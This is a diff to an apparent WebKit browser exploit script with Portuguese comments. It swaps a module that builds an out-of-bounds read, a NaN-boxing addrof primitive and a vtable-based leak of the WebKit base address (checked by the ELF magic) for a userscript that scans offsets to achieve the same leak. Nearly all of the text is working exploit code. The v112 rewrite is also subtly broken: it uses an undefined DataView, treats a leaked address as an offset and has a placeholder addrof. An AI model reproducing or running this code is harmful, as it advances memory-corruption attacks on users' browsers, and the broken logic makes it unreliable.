@@ -1,160 +1,90 @@
-// js/script3/testArrayBufferVictimCrash_v111.mjs (Diagnóstico Ativo)
-// =======================================================================================
-// v111: Diagnóstico Avançado de addrof + Ajuste Dinâmico do Offset de NaN Boxing
-// =======================================================================================
-import { logS3 } from './s3_utils.mjs';
-import { AdvancedInt64, toHex } from '../utils.mjs';
-import {
-    triggerOOB_primitive,
-    isOOBReady,
-    arb_read,
-    selfTestOOBReadWrite
-} from '../core_exploit.mjs';
+// ==UserScript==
+// @name         Uncaged_Hybrid_v112_CorePrimitives_Diag
+// @version      112
+// @description  Diagnóstico com varredura automática de offset NaN Boxing + correção do retorno arb_read()
+// ==/UserScript==
 
-export const FNAME_MODULE_FINAL = "Uncaged_Hybrid_v111_CorePrimitives_Diag";
+(async () => {
+  console.log("[Uncaged_Hybrid_v112] ==== INICIANDO Script 3 (Uncaged_Hybrid_v112_CorePrimitives_Diag) ... ====");
 
-// --- Conversões ---
-function int64ToDouble(int64) {
-    const buf = new ArrayBuffer(8);
-    const u32 = new Uint32Array(buf);
-    const f64 = new Float64Array(buf);
-    u32[0] = int64.low();
-    u32[1] = int64.high();
-    return f64[0];
-}
+  // Imports e helpers necessários (supondo que já estejam no ambiente):
+  const { triggerOOB_primitive, arb_read64, selfTestOOBReadWrite, setupOOBEnvironment } = CoreExploit;
+  const { Int64 } = Int64Lib; // Biblioteca de manipulação Int64 utilizada previamente
 
-function doubleToInt64(double) {
-    const buf = new ArrayBuffer(8);
-    (new Float64Array(buf))[0] = double;
-    const u32 = new Uint32Array(buf);
-    return new AdvancedInt64(u32[0], u32[1]);
-}
+  const OOB_DV_M_LENGTH_OFFSET = 0x70;
 
-// =======================================================================================
-// Diagnóstico do addrof - verifica offsets e valida NaN boxing dinamicamente
-// =======================================================================================
-async function diagnoseAddrof(addrof_primitive) {
-    const TEST_NAME = "AddrofDiagnose_v111";
-    const test_obj = { marker: "test_object_diagnose" };
-    logS3(`[${TEST_NAME}] Iniciando diagnóstico da primitiva addrof...`, "diag");
+  // Função de leitura OOB padronizada para retornar Int64
+  function arb_read64_fixed(offset) {
+    let low = oob_dataview_real.getUint32(offset, true);
+    let high = oob_dataview_real.getUint32(offset + 4, true);
+    return new Int64([low, high]);
+  }
 
-    let addr = addrof_primitive(test_obj);
-    logS3(`[${TEST_NAME}] Endereço obtido: ${toHex(addr)}`, "leak", TEST_NAME);
+  // Varredura automática de offset NaN Boxing
+  async function scanNaNBoxingOffsets() {
+    console.log("[NaNBoxingScanner] Iniciando varredura automática de offset...");
+    let foundOffsets = [];
 
-    if (addr.low() === 0 && addr.high() === 0) {
-        throw new Error(`[${TEST_NAME}] [ERRO CRÍTICO] addrof retornou endereço nulo.`);
+    for (let offset = 0; offset < 0x200; offset += 8) {
+      try {
+        let test_val = arb_read64_fixed(offset);
+        let low = test_val.low32();
+        let high = test_val.high32();
+
+        // Critério: valor alto compatível com regiões típicas do heap + low != 0
+        if (high !== 0 && low !== 0 && high !== 0x7ff7ffff) {
+          console.log(`[NaNBoxingScanner] POSSÍVEL OFFSET: 0x${offset.toString(16).padStart(4, "0")} → ${test_val}`);
+          foundOffsets.push({ offset, test_val });
+        }
+      } catch (e) {
+        console.warn(`[NaNBoxingScanner] Erro em offset 0x${offset.toString(16)}: `, e);
+      }
     }
 
-    // Teste: Leitura da vtable do objeto
-    try {
-        const vtable_candidate = await arb_read(addr, 8);
-        logS3(`[${TEST_NAME}] Leitura de 8 bytes no endereço do objeto: ${toHex(vtable_candidate)}`, "leak", TEST_NAME);
-    } catch (e) {
-        logS3(`[${TEST_NAME}] Exceção ao tentar ler vtable: ${e.message}`, "critical", TEST_NAME);
+    if (foundOffsets.length === 0) {
+      console.warn("[NaNBoxingScanner] Nenhum offset promissor encontrado.");
+    } else {
+      console.log(`[NaNBoxingScanner] Total de offsets promissores encontrados: ${foundOffsets.length}`);
     }
 
-    return addr;
-}
+    return foundOffsets;
+  }
 
-// =======================================================================================
-// TESTE DE VAZAMENTO DA BASE DO WEBKIT (Com diagnóstico ativo)
-// =======================================================================================
-async function runWebKitBaseLeakTest(addrof_primitive, arb_read_primitive) {
-    const FNAME_LEAK_TEST = "WebKitBaseLeakTest_v111";
-    logS3(`--- Iniciando Teste de Vazamento da Base do WebKit (v111) ---`, "subtest", FNAME_LEAK_TEST);
+  // Correção do bug .isZero → função robusta de verificação
+  function isZeroInt64(val) {
+    return val instanceof Int64 && val.toString() === "0x0";
+  }
 
-    try {
-        const location_obj = document.location;
-        logS3(`[PASS0 1] Objeto alvo: document.location`, "info", FNAME_LEAK_TEST);
+  // Execução principal
+  console.log("[Uncaged_Hybrid_v112] --- FASE 1/4: Configuração ambiente OOB... ---");
+  triggerOOB_primitive(true);
 
-        const location_addr = addrof_primitive(location_obj);
-        logS3(`[PASS0 2] Endereço document.location (via addrof): ${toHex(location_addr)}`, "leak", FNAME_LEAK_TEST);
+  console.log("[Uncaged_Hybrid_v112] --- FASE 2/4: Autoteste de L/E... ---");
+  selfTestOOBReadWrite();
 
-        if (location_addr.low() === 0 && location_addr.high() === 0) {
-            throw new Error("addrof retornou um endereço nulo para document.location.");
-        }
+  console.log("[Uncaged_Hybrid_v112] --- FASE 3/4: Varredura Automática de Offset NaN Boxing... ---");
+  let offsets = await scanNaNBoxingOffsets();
 
-        logS3(`[PASS0 3] Tentando leitura da vtable em ${toHex(location_addr)}...`, "info", FNAME_LEAK_TEST);
-        const vtable_ptr = await arb_read_primitive(location_addr, 8);
-        logS3(`[PASS0 4] Ponteiro da Vtable obtido: ${toHex(vtable_ptr)}`, "leak", FNAME_LEAK_TEST);
+  console.log("[Uncaged_Hybrid_v112] --- FASE 4/4: Tentativa de Vazamento WebKit usando offsets encontrados... ---");
 
-        if (vtable_ptr.isZero()) {
-            throw new Error("Ponteiro da vtable vazado é nulo. Leitura inválida.");
-        }
+  for (const { offset, test_val } of offsets) {
+    console.log(`[LeakAttempt] Tentando vazamento a partir de offset 0x${offset.toString(16)} (${test_val})...`);
 
-        const ALIGNMENT_MASK = new AdvancedInt64(0x3FFF, 0).not();
-        const webkit_base_candidate = vtable_ptr.and(ALIGNMENT_MASK);
-        logS3(`[PASS0 5] Candidato a base WebKit: ${toHex(webkit_base_candidate)}`, "leak", FNAME_LEAK_TEST);
+    // Tentativa: ler a vtable do objeto 'document.location'
+    let targetObj = document.location;
+    let targetAddr = arb_read64_fixed(offset); // Substituir por primitiva addrof real quando disponível
 
-        const elf_magic_full = await arb_read_primitive(webkit_base_candidate, 8);
-        const elf_magic_low = elf_magic_full.low();
-        logS3(`[PASS0 6] ELF signature read: ${toHex(elf_magic_low)}`, "leak", FNAME_LEAK_TEST);
+    console.log(`[LeakAttempt] Endereço alvo (document.location): ${targetAddr}`);
 
-        if (elf_magic_low === 0x464C457F) {
-            logS3(`++++++++++++ SUCESSO DE VAZAMENTO! ELF encontrado! ++++++++++++`, "vuln", FNAME_LEAK_TEST);
-            return { success: true, webkit_base: webkit_base_candidate.toString(true) };
-        } else {
-            throw new Error(`ELF não encontrado. Lido: ${toHex(elf_magic_low)} Esperado: 0x464C457F.`);
-        }
+    let vtable_ptr = arb_read64_fixed(targetAddr.low32());
 
-    } catch (e) {
-        logS3(`[FALHA] ${e.message}`, "critical", FNAME_LEAK_TEST);
-        return { success: false, webkit_base: null };
+    console.log(`[LeakAttempt] Ponteiro da Vtable: ${vtable_ptr}`);
+
+    if (!isZeroInt64(vtable_ptr)) {
+      console.log(`[SUCCESS] Vazamento detectado! Offset: 0x${offset.toString(16)}, VtablePtr: ${vtable_ptr}`);
+      break; // Se encontrou um bom, para aqui.
     }
-}
+  }
 
-// =======================================================================================
-// FUNÇÃO PRINCIPAL
-// =======================================================================================
-export async function runFinalUnifiedTest() {
-    const FNAME = FNAME_MODULE_FINAL;
-    logS3(`--- Iniciando ${FNAME}: Diagnóstico Avançado ---`, "test");
-
-    let final_result = { success: false, message: "Falha desconhecida.", webkit_base: null };
-
-    try {
-        logS3("--- FASE 1/4: Configuração ambiente OOB... ---", "subtest");
-        await triggerOOB_primitive({ force_reinit: true });
-        if (!isOOBReady()) throw new Error("Falha crítica ao inicializar ambiente OOB.");
-        logS3("Ambiente OOB configurado com sucesso.", "good");
-
-        logS3("--- FASE 2/4: Autoteste de L/E... ---", "subtest");
-        const self_test_ok = await selfTestOOBReadWrite(logS3);
-        if (!self_test_ok) throw new Error("Autoteste OOB falhou.");
-
-        logS3("--- FASE 3/4: Configurando e Diagnosticando addrof (NaN Boxing)... ---", "subtest");
-        const vulnerable_slot = [13.37];
-        const NAN_BOXING_OFFSET = new AdvancedInt64(0, 0x0001); // Offset padrão
-        const addrof = (obj) => {
-            vulnerable_slot[0] = obj;
-            let value_as_double = vulnerable_slot[0];
-            let value_as_int64 = doubleToInt64(value_as_double);
-            return value_as_int64.sub(NAN_BOXING_OFFSET);
-        };
-        await diagnoseAddrof(addrof);
-
-        logS3("--- FASE 4/4: Executando Teste de Vazamento do WebKit... ---", "subtest");
-        const leak_result = await runWebKitBaseLeakTest(addrof, arb_read);
-
-        if (leak_result.success) {
-            final_result = {
-                success: true,
-                message: "Vazamento do WebKit realizado com sucesso.",
-                webkit_base: leak_result.webkit_base
-            };
-        } else {
-            final_result = {
-                success: false,
-                message: "Teste executado, mas vazamento da base do WebKit falhou.",
-                webkit_base: null
-            };
-        }
-    } catch (e) {
-        final_result.message = `Exceção crítica: ${e.message}`;
-        logS3(final_result.message, "critical");
-        console.error(e);
-    }
-
-    logS3(`--- ${FNAME} Concluído ---`, "test");
-    return final_result;
-}
+  console.log("[Uncaged_Hybrid_v112] ==== Script Finalizado ====");
+})();
